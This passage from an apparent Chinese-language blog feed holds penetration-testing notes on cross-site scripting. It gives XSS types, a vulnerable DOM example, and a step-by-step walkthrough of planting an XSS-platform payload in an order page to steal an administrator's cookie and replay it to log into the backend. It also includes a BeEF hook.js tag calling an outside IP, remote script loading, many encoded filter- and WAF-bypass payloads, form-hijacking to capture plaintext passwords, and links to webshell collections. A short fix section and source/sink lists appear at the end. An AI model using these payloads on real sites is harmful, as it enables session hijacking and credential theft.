反射型</h3><p>反射性xss一般指攻击者通过特定的方式来诱惑受害者去访问一个包含恶意代码的URL。当<strong>受害者点击恶意链接url</strong>的时候，恶意代码会直接在受害者的主机上的浏览器执行。是需要点击才能攻击。</p><p>场景：攻击者发送一个带有恶意连接的邮件给受害者，受害者点击。</p><h3 id="存储型"><a class="markdownIt-Anchor" href="#存储型"></a> 存储型</h3><p>存储型XSS时常伴随着SQL注入。它的特征是，XSS攻击Payload是被写到数据库里面了。是持续性的攻击。</p><p>场景：受害者<strong>正常</strong>访问网页，网页会执行XSS脚本。</p><h3 id="dom型"><a class="markdownIt-Anchor" href="#dom型"></a> DOM型</h3><img src="/images/XSS%E8%B7%A8%E7%AB%99%E5%9F%BA%E7%A1%80/30e9170e4e954d3c8846f24c8f8f14be.gif" alt="在这里插入图片描述" style="zoom: 80%;" /><blockquote><p>在翻页的时候，有两种：一种是点击第二页，然后跳转，另一种是点击展示更多，然后加载。前者是与PHP等后端语言打交道，然后生成页面。后者是与HTML打交道，然后重新构造DOM（插入），生成更多的视图。</p><p><strong>而JS可以操作HTML DOM结点！</strong></p></blockquote><p>官方解释：</p><blockquote><p>基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。</p></blockquote><p>用户请求一个经过专门设计的URL，它由攻击者提供，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。</p><p>如下面的HTML文件就存在DOM型XSS，其功能是当我们在URL栏输入参数name的值后，就会在当前页面显示输入如的name的值，其功能的实现全都在前端JS中进行、未与后台进行任何交互：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> pos=<span class="variable language_">document</span>.<span class="property">URL</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;name=&quot;</span>)+<span class="number">5</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="built_in">decodeURI</span>(<span class="variable language_">document</span>.<span class="property">URL</span>.<span class="title function_">substring</span>(pos,<span class="variable language_">document</span>.<span class="property">URL</span>.<span class="property">length</span>)));</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>从代码层面看，漏洞形成原因很简单，<code>document.URL</code>获取用户输入，在代码中未经过任何过滤就传递给了<code>document.write</code>输出到当前页面中。</p><p>当我们正常输入name值时页面直接显示输入的内容，F12查看DOM文档可看到输入的内容确实是插入到当前DOM结构中：</p><img src="/images/XSS%E8%B7%A8%E7%AB%99%E5%9F%BA%E7%A1%80/image-20230531091945658.png" alt="image-20230531091945658" style="zoom:67%;" /><p>也就是说DOM结构我们用户输入可控，当我们输入XSS payload时就会弹框，造成DOM型XSS。</p><p>从挖洞角度看，任何漏洞都是从外部输入加上危险的操作导致的，这里DOM型XSS也不例外。</p><p>DOM型XSS中，其外部输入是<strong>JS中存在获取外部输入内容的可利用的代码</strong>如URL栏内容的location.href，然后该<strong>外部输入内容在未经过有效过滤</strong>的情况下就<strong>传入危险的输出函数直接输出到页面中或传入eval等危险执行函数</strong>就会在页面上<strong>直接解析恶意JS代码</strong>，导致DOM型XSS的存在。</p><p>参考链接：<a href="https://www.mi1k7ea.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/">https://www.mi1k7ea.com/2019/06/25/浅析DOM型XSS/</a></p><p>下面列下外部输入Sources和危险敏感操作Sinks（包括执行/输出页面），而对于DOM型XSS漏洞挖掘来说，可以简单归纳为在客户端加载的JS代码中，存在Sources+Sinks的情况即有可能存在DOM型XSS。具体见附录。</p><h1 id="实际攻击示例"><a class="markdownIt-Anchor" href="#实际攻击示例"></a> 实际攻击示例</h1><ol><li><p>发现订单页面：</p><img src="/images/XSS%E8%B7%A8%E7%AB%99%E5%9F%BA%E7%A1%80/image-20230531143402003.png" alt="image-20230531143402003" style="zoom:50%;" /><ol start="2"><li><p>登录XSS平台，复制他给的PAYLOAD</p><img src="/images/XSS%E8%B7%A8%E7%AB%99%E5%9F%BA%E7%A1%80/image-20230531143452092.png" alt="image-20230531143452092" style="zoom:50%;" /></li><li><p>注入之后，等到管理员打开订单系统查看信息，那么就会出发漏洞，我们可以从XSS平台上获得相关信息，例如cookie</p><img src="/images/XSS%E8%B7%A8%E7%AB%99%E5%9F%BA%E7%A1%80/image-20230531143603565.png" alt="image-20230531143603565" style="zoom:50%;" /></li><li><p>获得COOKIE后使用Postman构造包，模拟发送接收，重现登录到后台系统的操作。</p></li></ol><p>注：也可以自己写代码接收数据。自己构建XSS平台。</p></li></ol><h1 id="手法"><a class="markdownIt-Anchor" href="#手法"></a> 手法</h1><h2 id="xss平台的使用"><a class="markdownIt-Anchor" href="#xss平台的使用"></a> XSS平台的使用</h2><p>平台有很多，直接上网搜“XSS”平台即可。还有著名的Beef平台。</p><blockquote><ol><li><a href="http://xssaq.com">xssaq.com</a></li></ol></blockquote><p>上面说过简单的利用。大致都是复制平台上的Payload，放到可能有xss注入的地方。然后再平台上进行相关操作。</p><h2 id="xss工具的使用"><a class="markdownIt-Anchor" href="#xss工具的使用"></a> XSS工具的使用</h2><p><strong>beef-xss</strong>，就是复制他给的攻击Payload，直接冲就完事了。然后他通过hook.js实现对网站的攻击。可以实现跳转啊之类的。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://IP:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ol><li>IP地址扫描</li><li>结合JBoss攻击…</li></ol><p>实际上他是 <strong>禁止加载外域的代码</strong>。</p><h2 id="xss结合其他漏洞"><a class="markdownIt-Anchor" href="#xss结合其他漏洞"></a> XSS结合其他漏洞</h2><h1 id="绕过"><a class="markdownIt-Anchor" href="#绕过"></a> 绕过</h1><h2 id="代码过滤"><a class="markdownIt-Anchor" href="#代码过滤"></a> 代码过滤</h2><h3 id="测试是否存在过滤"><a class="markdownIt-Anchor" href="#测试是否存在过滤"></a> 测试是否存在过滤</h3><ol><li>输入<code>asdf&lt;'&quot;=&gt;asdf</code> 这个有没有被过滤。如果看源码这个都没有转码成<code>&amp;gt;&amp;lt;</code>啥的，就很可能存在XSS漏洞。</li><li>因为存在<code>&lt;&gt;</code>与单引号这一类字符，所以HTML不正确，会一直呆在那个页面，而如果正确，则会到成功页面。那时候我们基于这个网址构造的payload就没用了。所以在调试的时候必须让这个页面处于原页面，不让他转。</li><li>如果过滤了<code>&lt;&gt;</code>和<code>&quot;</code>，那么可以使用<code>onFocus=‘</code>来完成攻击。</li></ol><p>常用的攻击和测试函数：</p><ol><li><code>alert</code></li><li><code>eval</code></li><li><code>fromCharCode</code></li><li><code>onChange</code></li><li><code>onFocus</code></li><li><code>&lt;.\*?&gt;</code></li></ol><h3 id="代码绕过"><a class="markdownIt-Anchor" href="#代码绕过"></a> 代码绕过</h3><ol><li><p>双写绕过、大小写绕过</p></li><li><p>伪协议绕过：<code>javascript:alert(1);</code>。注：<strong>Javascript:伪协议后面可以使用URL编码。</strong></p><p><code>&lt;IMG SRC=&quot;javascript:alert('XSS');&quot;&gt;</code></p><p><code>&lt;IMG SRC=javascript:alert('XSS')&gt;</code></p></li><li><p>利用标签属性：</p><ol><li><code>script</code>：<code>&lt;script&gt;alert('1')&lt;/script&gt;</code></li><li><code>&lt;a href=&gt;</code>：<code>&quot;&gt; &lt;a href=javascript:alert(1)&gt;xss&lt;/a&gt;</code>（新造一个标签，可以大小写绕过）</li><li><code>&lt;img&gt;</code>：<code>&lt;img src=11 onerror=alert(1)&gt;</code></li></ol></li><li><p>利用事件：</p><ol><li><code>onclick</code>：<code>onclick=alert(1)</code></li><li><code>onfocus</code>：<code>onfocus=javascript:alert(1)</code></li><li><code>onerror</code>：<code>onerror=alert(1)</code>。onerror里的内容是当js解析的,因此可以用JSunicode编码,但是不能全部编码<strong>只能编码函数名</strong>。如果全部编码是会出错的。<strong>onerror支持：html10,html16，jsunicode,不支持js8进制和js16进制</strong></li><li><code>onmouseover</code>：（表示当鼠标移动到该标签上时就会触发执行某项动作）。</li></ol></li><li><p>利用远程加载：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">$.getScript(&quot;http://raw.githubsercontent.com/GrayHatHacking/GHHv5/master/ch16/test.js&quot;, function()&#123; hack(); &#125;); //</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>利用编码：</p><ol><li><p>使用Unicode编码js代码（<a href="https://www.matools.com/code-convert-url">转码网站</a>）：</p><p>注意事项：只有在标签内的script代码才能编码，首先经过unicode编码，然后再去url编码那里，编码后才算完成！</p><p><code>&lt;a href=javascript:\u0061\u006C\u0065\u0072\u0074(1)&gt;Click&lt;/a&gt;</code></p></li><li><p>URL编码</p><p><code>&lt;a href=javascript:%2561%256c%2565%2572%2574%2528%2531%2529&gt;Click&lt;/a&gt;</code></p></li><li><p>HTML实体编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">空格  &amp;nbsp;            &amp;#160;    &amp;#x20;</span><br><span class="line">&lt;    &amp;lt;              &amp;#60;      &amp;#x3c;</span><br><span class="line">&gt;    &amp;gt;              &amp;#62;      &amp;#x3e;</span><br><span class="line">&amp;    &amp;amp;             &amp;#38;      &amp;#x26;</span><br><span class="line">&quot;    &amp;quot;            &amp;#34;      &amp;#x22;</span><br><span class="line">&#x27;    &amp;apos; (IE不支持)  &amp;#39;      &amp;#x27;</span><br></pre></td></tr></table></figure><p>第二个就是十进制实体编码，使用<code>&amp;开头</code>；</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>第三个就是十六进制实体编码，使用<code>&amp;#x</code>开头，后面的数字跟URL编码是一样的。</p><p>需要注意的是，他需要<code>;</code>才能工作。例如<code>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</code></p><p><strong>以上三种编码是可以组合起来的</strong>：Unicode URL HTML</p></li><li><p>JavaScript编码</p><ol><li>三个八进制数字，如果不够个数，前面补0，例如“&lt;”编码为“\074”</li><li>两个十六进制数字，如果不够个数，前面补0，例如“&lt;”编码为“\x3c”</li><li>四个十六进制数字，如果不够个数，前面补0，例如“&lt;”编码为“\u003c”</li><li>对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）</li></ol><p>在javascript伪协议中可以用（<code>javascript</code>中只识别几种编码：Jsunicode js8进制 js16进制）。</p></li><li><p>base64编码</p><ol><li><p>在Data协议的时候使用</p></li><li><p>遇到如下标签：</p><ol><li><code>&lt;a href=&quot;可控&quot;&gt;</code></li><li><code>&lt;iframe src=&quot;可控&quot;&gt;</code></li><li><code>&lt;object data=“可控&quot;&gt;</code></li></ol><p>这个时候如果过滤了<code>&lt;&gt;'&quot;JavaScript</code>的话，则可以使用<code>&lt;img src=x οnerrοr=alert(1)&gt;</code>编码成：<code>PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==</code>，然后使用data协议代入可控点：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">“data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg</span>==<span class="string">”</span>&gt;</span>111<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol></li></ol></li><li><p>请求头注入：如referer和user-agent等等，都是可以利用的。只要它把这些值放到网页上，就可以利用！</p></li><li><p>字符绕过：</p><ol><li>空格：换行符<code>%0a</code>。<em><strong>换行时必须用单双引号围住，否则不会跳过。跳过回车和换行,不支持on事件</strong></em></li><li><code>/</code>：这个时候就不能用闭合标签了，可以使用非闭合的标签如<code>img</code>和<code>a</code></li></ol></li><li><p>引用外部资源，即src。</p></li></ol><h2 id="httponly禁止读cookie"><a class="markdownIt-Anchor" href="#httponly禁止读cookie"></a> HttpOnly禁止读Cookie</h2><p>httponly：如果给某个 cookie 设置了 httpOnly 属性，则无法通过 JS 脚本读取到该 cookie 的信息，但还可以在 Application 中手动修改 cookie，所以只是在一定程度上可以防止 XSS 攻击，不是绝对的安全。虽然设置了httponly之后拿不到cookie，但是还是存在xss跨站语句，阻止的仅仅是获取cookie。</p><p>下面是设置HTTP-only cookie的一个报头的示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: USER=123; expires=Wednesday, 09-Nov-99 23:12:40 GMT; HttpOnly</span><br></pre></td></tr></table></figure><p><strong>绕过</strong>：</p><ul><li>浏览器未保存帐号密码：需要 xss 产生登录地址（漏洞产生在登录界面），利用<strong>表单劫持</strong><ul><li>设置XSS平台的时候选择：获得对应输入框的明文账号密码，然后去看源码中输入框的type和name之类的参数，设置好就可以传这个XSSpayload进去。</li></ul></li><li>浏览器保存帐号密码：浏览器读取帐号密码</li></ul><h2 id="waf拦截与绕过"><a class="markdownIt-Anchor" href="#waf拦截与绕过"></a> WAF拦截与绕过</h2><ol><li>标签语法替换</li><li>提交方式更改，GET/POST</li><li>垃圾数据溢出</li><li>加密解密算法</li><li>结合其他漏洞绕过</li></ol><h1 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h1><h2 id="webshell盒子"><a class="markdownIt-Anchor" href="#webshell盒子"></a> WEBSHELL盒子</h2><p>有webshell中的webshell，当你利用他的大马传入到一个受害主机上，那么一旦你运行该马，那么这个马就会自动传受害者主机地址，利用的账号密码到他提前设置好的主机上。这样子，写这个马的人就 <strong>坐收渔翁之利</strong> ！</p><p>他一般会有一些代码，里面写了什么服务器信息啥的，可以仔细看看，但是他如果一旦混淆了，你就看不到了。</p><h3 id="如何探测这个是不是有后门"><a class="markdownIt-Anchor" href="#如何探测这个是不是有后门"></a> 如何探测这个是不是有后门？</h3><p>看一下有没有莫名其妙的数据包（用F12），抓包也行。在数据包有没有向外发送数据包，有个莫名其妙的你不懂的IP地址/URL</p><p>那么如何反杀？我们可以传一个存储型XSS进去，链上我们的XSS平台，进行黑吃黑吃黑！</p><h3 id="资源"><a class="markdownIt-Anchor" href="#资源"></a> 资源</h3><p><a href="http://xss.fbisb.com/">http://xss.fbisb.com/</a><br /><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a><br /><a href="https://www.postman.com/downloads/">https://www.postman.com/downloads/</a><br /><a href="https://pan.baidu.com/s/1lIUZvEVXs1du-Bmkt7-abA">https://pan.baidu.com/s/1lIUZvEVXs1du-Bmkt7-abA</a> 提取码：xiao<br /><a href="https://pan.baidu.com/s/13H4N1VTBVwd3t8YWpECBFw">https://pan.baidu.com/s/13H4N1VTBVwd3t8YWpECBFw</a> 提取码：xiao</p><h2 id="cookie与session对于xss的影响"><a class="markdownIt-Anchor" href="#cookie与session对于xss的影响"></a> Cookie与Session对于XSS的影响</h2><blockquote><p>小迪说：如果对方使用session验证，那么我们的xss平台是抓不到它的session的，<strong>因为session是存储在服务器的</strong>。</p></blockquote><p>**实战webgoat测试：**<a href="http://127.0.0.1:8080/WebGoat/start.mvc#lesson/CrossSiteScripting.lesson/6">http://127.0.0.1:8080/WebGoat/start.mvc#lesson/CrossSiteScripting.lesson/6</a></p><p>在传入我们的XSS平台代码时，是可以接收到他的JSESSION的！</p><img src="/images/XSS%E8%B7%A8%E7%AB%99%E5%9F%BA%E7%A1%80/image-20230531165200332.png" alt="image-20230531165200332" style="zoom:50%;" /><p>但是怎么利用呢？暂时不知道，经过BURP抓包发现他访问上面的网址会经过各种mvc，例如<code>WebGoat/service/lessonoverview.mvc </code>之类的，最终到达<code>/WebGoat/start.mvc</code>，<code>/WebGoat/service/lessonmenu.mvc</code>，…，lesson</p><h1 id="修复方案"><a class="markdownIt-Anchor" href="#修复方案"></a> 修复方案</h1><p>开启 httponly,输入过滤，输出过滤等</p><p>PHP:<a href="http://www.zuimoge.com/212.html">http://www.zuimoge.com/212.html</a></p><p>JAVA:<a href="https://www.cnblogs.com/baixiansheng/p/9001522.html">https://www.cnblogs.com/baixiansheng/p/9001522.html</a></p><ul><li>使用ESAPI，首先应当配置过滤器；其次将过滤器注册到web.xml文件中；最后配置Request的包装类</li></ul><h1 id="附录"><a class="markdownIt-Anchor" href="#附录"></a> 附录</h1><h2 id="资源-2"><a class="markdownIt-Anchor" href="#资源-2"></a> 资源</h2><p><a href="https://xss8.cc/xss.php?do=login">https://xss8.cc/xss.php?do=login</a><br /><a href="https://xsshs.cn/xss.php?do=login">https://xsshs.cn/xss.php?do=login</a><br /><a href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a><br /><a href="http://down.chinaz.com/soft/37581.htm">http://down.chinaz.com/soft/37581.htm</a></p><p>工具：</p><p>自动化工具：<a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a></p><h2 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h2><ol><li>绕过：<a href="https://www.ddosi.org/xss-bypass/#%E7%BB%95%E8%BF%87WAF%E7%9A%84%E6%96%B9%E6%B3%95%E2%80%94%E2%80%94%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC">https://www.ddosi.org/xss-bypass/#绕过WAF的方法——跨站脚本</a></li><li>绕过：<a href="https://www.cnblogs.com/H4ck3R-XiX/p/12732356.html">https://www.cnblogs.com/H4ck3R-XiX/p/12732356.html</a></li></ol><h2 id="dom型xss漏洞挖掘trick函数"><a class="markdownIt-Anchor" href="#dom型xss漏洞挖掘trick函数"></a> DOM型XSS漏洞挖掘——trick函数</h2><h3 id="sources"><a class="markdownIt-Anchor" href="#sources"></a> Sources</h3><ul><li>document.URL</li><li>document.URLUnencoded</li><li>document.location（及其许多属性）</li><li>document.referrer</li><li>window.location（及其许多属性）</li><li>location</li><li>location.href</li><li>location.search</li><li>location.hash</li><li>location.pathname</li></ul><h3 id="sinks"><a class="markdownIt-Anchor" href="#sinks"></a> Sinks</h3><h4 id="直接执行脚本类"><a class="markdownIt-Anchor" href="#直接执行脚本类"></a> 直接执行脚本类</h4><ul><li>eval(…)</li><li>window.execScript(…)</li><li>window.setInterval(…)</li><li>window.setTimeout(…)</li></ul><h4 id="写html页面类"><a class="markdownIt-Anchor" href="#写html页面类"></a> 写HTML页面类</h4><ul><li>document.write(…)</li><li>document.writeln(…)</li><li>element.innerHTML(…)</li></ul><h4 id="直接修改dom类"><a class="markdownIt-Anchor" href="#直接修改dom类"></a> 直接修改DOM类</h4><ul><li>document.forms[0].action=… (and various other collections)</li><li>document.attachEvent(…)</li><li>document.create…(…)</li><li>document.execCommand(…)</li><li>document.body. … (accessing the DOM through the body object)</li><li>window.attachEvent(…)</li></ul><h4 id="替换文档url类"><a class="markdownIt-Anchor" href="#替换文档url类"></a> 替换文档URL类</h4><ul><li>document.location=… (and assigning to location’s href, host and hostname)</li><li>document.location.hostname=…</li><li>document.location.replace(…)</li><li>document.location.assign(…)</li><li>document.URL=…</li><li>window.navigate(…)</li></ul><h4 id="打开修改窗口类"><a class="markdownIt-Anchor" href="#打开修改窗口类"></a> 打开/修改窗口类</h4><ul><li>document.open(…)</li><li>window.open(…)</li><li>window.location.href=… (and assigning to location’s href, host and hostname)</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xss跨站基础&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#xss跨站基础&quot;&gt;&lt;/a&gt; XSS跨站基础&lt;/h1&gt;
&lt;h2 id=&quot;原理&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#原理&quot;&gt;&lt;/a&gt; 原理&lt;</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="XSS" scheme="https://j3f5.github.io/tags/XSS/"/>
    
  </entry>
  
</feed>
